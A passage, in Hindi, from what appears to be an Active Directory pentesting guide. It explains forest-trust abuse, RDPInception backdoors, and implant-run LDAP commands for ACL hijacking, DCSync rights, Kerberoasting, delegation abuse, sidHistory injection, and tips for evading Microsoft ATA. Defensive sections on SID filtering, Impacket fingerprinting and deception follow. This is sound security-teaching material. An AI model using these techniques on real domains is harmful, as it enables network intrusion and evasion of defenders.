SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

इस परिदृश्य में, एक बाहरी डोमेन आपके डोमेन पर भरोसा करता है, जिससे आपको उस पर **अनिश्चित अनुमतियाँ** मिलती हैं। आपको पता लगाना होगा कि आपके डोमेन के कौन-से प्रिंसिपल्स को बाहरी डोमेन पर किस तरह की पहुँच है, और फिर उसका फायदा उठाने की कोशिश करनी होगी:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### बाहरी फ़ॉरेस्ट डोमेन - एक-तरफ़ा (आउटबाउंड)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

इस परिदृश्य में **आपका domain** किसी **अलग-अलग domains** के principal को कुछ **privileges** दे रहा है।

हालाँकि, जब किसी domain पर **trusting domain द्वारा trust किया जाता है**, तो trusted domain एक **predictable name** वाला **user बनाता है**, जिसका **password, trusted password** होता है। इसका मतलब है कि **trusting domain के user को access करके trusted domain में प्रवेश करना**, उसकी enumeration करना और फिर अधिक privileges तक पहुँचने की कोशिश करना संभव है:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain को compromise करने का एक और तरीका है **domain trust की विपरीत दिशा** में बनाया गया [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) ढूँढ़ना (जो बहुत आम नहीं है)।

trusted domain को compromise करने का एक और तरीका है ऐसी machine पर इंतज़ार करना जहाँ **trusted domain का user** **RDP** के ज़रिए login कर सके। इसके बाद, attacker RDP session process में code inject कर सकता है और वहाँ से **victim के origin domain तक access** कर सकता है।\
इसके अलावा, अगर **victim ने अपनी hard drive mount की हो**, तो attacker **RDP session** process से **hard drive के startup folder में backdoors** रख सकता है। इस technique को **RDPInception** कहा जाता है।


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trusts के पार SID history attribute का लाभ उठाने वाले attacks का जोखिम SID Filtering से कम होता है। यह सभी inter-forest trusts पर default रूप से सक्रिय होता है। इसके पीछे यह मान्यता है कि intra-forest trusts सुरक्षित हैं और Microsoft के अनुसार security boundary domain के बजाय forest है।
- हालाँकि, एक पेच है: SID filtering applications और user access में बाधा डाल सकता है, इसलिए इसे कभी-कभी निष्क्रिय कर दिया जाता है।

### **Selective Authentication:**

- Inter-forest trusts के लिए Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users अपने-आप authenticate न हों। इसके बजाय, users को trusting domain या forest के भीतर domains और servers तक access पाने के लिए स्पष्ट permissions चाहिए।
- ध्यान दें कि ये उपाय writable Configuration Naming Context (NC) के exploitation या trust account पर attacks से सुरक्षा नहीं देते।

[**ired.team पर domain trusts के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implants से LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में फिर से लागू करता है, जो पूरी तरह on-host implant (जैसे, Adaptix C2) के अंदर चलते हैं। Operators `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से pack compile करते हैं, `ldap.axs` load करते हैं, और फिर beacon से `ldap <subcommand>` चलाते हैं। सारा traffic, मौजूदा logon security context का उपयोग करके, signing/sealing के साथ LDAP (389) या auto certificate trust के साथ LDAPS (636) पर चलता है; इसलिए socks proxies या disk artifacts की ज़रूरत नहीं होती।<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers`, short names/OU paths को full DNs में resolve करते हैं और संबंधित objects dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo`, मनचाहे attributes (security descriptors सहित) और `rootDSE` से forest/domain metadata प्राप्त करते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd`, roasting candidates, delegation settings, और LDAP से सीधे मौजूद [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors दिखाते हैं।
- `get-acl` और `get-writable --detailed`, trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance की सूची बनाने के लिए DACL parse करते हैं; इससे ACL privilege escalation के लिए तुरंत targets मिल जाते हैं।

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### escalation और persistence के लिए LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को उन जगहों पर नए principals या machine accounts तैयार करने देते हैं जहाँ OU rights मौजूद हों। Write-property rights मिलने के बाद `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे targets को hijack करते हैं।
- ACL-केंद्रित commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync`, किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं—और PowerShell/ADSI artifacts छोड़े बिना। `remove-*` counterparts जोड़े गए ACEs को साफ़ करते हैं।

### Delegation, roasting, और Kerberos abuse

- `add-spn`/`set-spn` किसी compromised user को तुरंत Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) password को छुए बिना उसे AS-REP roasting के लिए चिह्नित करता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को फिर से लिखते हैं। इससे constrained/unconstrained/RBCD attack paths सक्षम होते हैं और remote PowerShell या RSAT की आवश्यकता नहीं रहती।

### sidHistory injection, OU relocation, और attack surface को आकार देना

- `add-sidhistory` किसी नियंत्रित principal की SID history में privileged SIDs inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे LDAP/LDAPS के ज़रिए पूरी तरह stealthy access inheritance मिलता है।
- `move-object` computers या users का DN/OU बदलता है, जिससे attacker assets को delegated rights के दायरे में लाने के बाद `set-password`, `add-groupmember`, या `add-spn` इस्तेमाल कर सकता है। Move permissions और inheritance checks के लिए [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) देखें।
- सीमित दायरे वाले removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) operator को credentials या persistence हासिल करने के बाद तेज़ी से rollback करने देते हैं, जिससे telemetry कम होती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य बचाव

[**यहाँ credentials को सुरक्षित रखने के तरीकों के बारे में और जानें।**](../stealing-credentials/credentials-protections.md)

### **Credential Protection के रक्षात्मक उपाय**

- **Domain Admins पर प्रतिबंध**: सुझाव दिया जाता है कि Domain Admins को केवल Domain Controllers पर login करने की अनुमति हो; अन्य hosts पर उनका उपयोग न किया जाए।
- **Service Account Privileges**: सुरक्षा बनाए रखने के लिए services को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **समय-सीमित privileges**: DA privileges की आवश्यकता वाले tasks के लिए, इनका उपयोग सीमित अवधि तक होना चाहिए। इसे इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 का audit करें, फिर LDAP MITM/relay attempts को रोकने के लिए DCs/clients पर LDAP signing और LDAPS channel binding लागू करें।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity की protocol-level fingerprinting

अगर आप आम AD tradecraft का पता लगाना चाहते हैं, तो **केवल operator-नियंत्रित artifacts** जैसे बदले गए binary names, service names, temp batch files, या output paths पर निर्भर **न रहें**। वैध Windows clients किस तरह [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, और WMI traffic बनाते हैं, उसका baseline तैयार करें; फिर ऐसे **implementation quirks** ढूँढें जो operator के `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, या `ntlmrelayx.py` में बदलाव करने के बाद भी बने रहते हैं।<sup>[[8]](#references)</sup>

- **अलग से high-confidence candidates** (अपने baseline के विरुद्ध जाँच के बाद):
  - `auth_context_id = 79231 + ctx_id` का उपयोग करने वाला authenticated DCE/RPC
  - `0xff` से भरी DCE/RPC authentication padding
  - LDAP Kerberos binds, जिनमें raw Kerberos `AP-REQ` सीधे SPNEGO `mechToken` में रखा गया हो
  - ASCII जैसे दिखने वाले `ClientGuid` values वाले SMB2/3 negotiate requests
  - गैर-मानक namespace `//./root/cimv2` का उपयोग करने वाला WMI `IWbemLevel1Login::NTLMLogin`
  - Hardcoded Kerberos nonce values
- **Correlation/scoring features के रूप में अधिक उपयोगी**:
  - Sparse या duplicated Kerberos etype lists, असामान्य/अनुपस्थित `PA-DATA`, या TGS-REQ etype ordering जो native Windows से अलग हो
  - NTLM Type 1 messages जिनमें version info न हो, या Type 3 messages जिनमें host names null हों
  - SPNEGO के बजाय DCE/RPC में ले जाया गया raw NTLMSSP, अनुपस्थित DCE/RPC verification trailers, या SPNEGO/Kerberos OID mismatches
  - एक ही host/user/session/time window से मिले ऐसे कई traits, किसी एक कमजोर field से कहीं अधिक मज़बूत संकेत होते हैं
- **Standalone alerts के बजाय enrichment के रूप में उपयोग करें**:
  - Default filenames, output paths, random service names, temporary batch names, default computer account names, और tool-specific HTTP/WebDAV/RDP/MSSQL strings
  - Operators इन्हें आसानी से बदल सकते हैं; इनका सबसे अच्छा उपयोग यह समझाने में है कि cross-protocol cluster संदिग्ध क्यों है
- **Operational notes**:
  - इनमें से कुछ signals के लिए decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, या service-side visibility की ज़रूरत होती है
  - Alerts बनाने से पहले Samba/Linux clients, appliances, और legacy software के विरुद्ध जाँचें
  - Baseline पर भरोसा बढ़ने के साथ detections को enrichment -> hunting -> alerting के रूप में आगे बढ़ाएँ

### **Deception Techniques लागू करना**

- Deception लागू करने में decoy users या computers जैसे traps तैयार करना शामिल है, जिनमें password कभी expire न होने या Trusted for Delegation के रूप में चिह्नित होने जैसी विशेषताएँ हो सकती हैं। विस्तृत तरीके में खास rights वाले users बनाना या उन्हें high privilege groups में जोड़ना शामिल है।<sup>[[2]](#references)</sup>
- एक व्यावहारिक उदाहरण में ऐसे tools का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques लागू करने के बारे में अधिक जानकारी [GitHub पर Deploy-Deception](https://github.com/samratashok/Deploy-Deception) में मिल सकती है।

### **Deception की पहचान करना**

- **User Objects के लिए**: संदिग्ध संकेतों में असामान्य ObjectSID, कम बार logon होना, creation dates, और bad password counts का कम होना शामिल है।
- **सामान्य संकेत**: संभावित decoy objects के attributes की तुलना असली objects से करने पर विसंगतियाँ सामने आ सकती हैं। [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे tools ऐसी deception की पहचान करने में मदद कर सकते हैं।

### **Detection Systems को bypass करना**

- **Microsoft ATA Detection Bypass**:
  - **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration न करें।
  - **Ticket Impersonation**: Ticket बनाने के लिए **aes** keys का उपयोग detection से बचने में मदद करता है, क्योंकि इससे NTLM पर downgrade नहीं करना पड़ता।
  - **DCSync Attacks**: ATA detection से बचने के लिए इन्हें non-Domain Controller से चलाने की सलाह दी जाती है, क्योंकि Domain Controller से सीधे चलाने पर alerts trigger होंगे।

## References

- [1] [Domain Trusts पर हमला करने की मार्गदर्शिका](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory में Deception के लिए Trusts बनाना](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin से Enterprise Admin तक](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation के लिए In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hashes को Wordlist के रूप में Weaponize करना](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket का विश्लेषण](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon के ज़रिए Active Directory Accounts पर कब्ज़ा करना](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 से जुड़े Netlogon secure channel connections में बदलावों को कैसे प्रबंधित करें](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [भूले-बिसरे Null Session और MS-RPC interfaces की पड़ताल](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domains के बीच security boundary के रूप में SID filter? (भाग 4) - SID filtering bypass पर शोध](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domains के बीच security boundary के रूप में SID filter? (भाग 5) - Golden GMSA trust attack - child से parent तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domains के बीच security boundary के रूप में SID filter? (भाग 6) - Schema change trust attack - child से parent तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 के साथ DA से EA तक](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS का दुरुपयोग करके 5 मिनट में child domain admins से enterprise admins तक पहुँचना: आगे का लेख](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoors डिज़ाइन करना](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
